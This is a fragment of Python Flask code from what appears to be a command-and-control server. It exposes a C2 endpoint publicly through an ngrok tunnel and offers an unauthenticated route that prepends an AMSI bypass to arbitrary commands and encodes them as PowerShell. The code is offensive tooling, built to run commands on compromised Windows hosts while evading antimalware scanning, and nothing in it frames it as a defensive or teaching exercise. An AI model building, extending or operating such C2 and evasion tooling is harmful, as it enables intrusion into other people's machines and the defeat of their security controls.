        "url": PUBLIC_C2_URL if NGROK_TUNNEL else None,
        "has_token": bool(conf.get_default().auth_token)
    })

@app.route("/admin/set_public_url", methods=["POST"])
@login_required
def set_public_url():
    global PUBLIC_C2_URL
    url = (request.json or {}).get("url", "").strip().rstrip("/")
    if url:
        if not url.startswith("http"):
            url = "http://" + url
        PUBLIC_C2_URL = url
        return jsonify({"status": "success", "public_url": PUBLIC_C2_URL})
    PUBLIC_C2_URL = None
    return jsonify({"status": "success", "message": "Reverted to local mode"})

@app.route("/admin/encode", methods=["POST"])
def encode_cmd():
    cmd = (request.json or {}).get("command", "")
    if not cmd:
        return jsonify({"status": "error"}), 400
    full = get_amsi_bypass() + " " + cmd
    return jsonify({"status": "success", "encoded": encode_powershell(full)})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5001, debug=False)
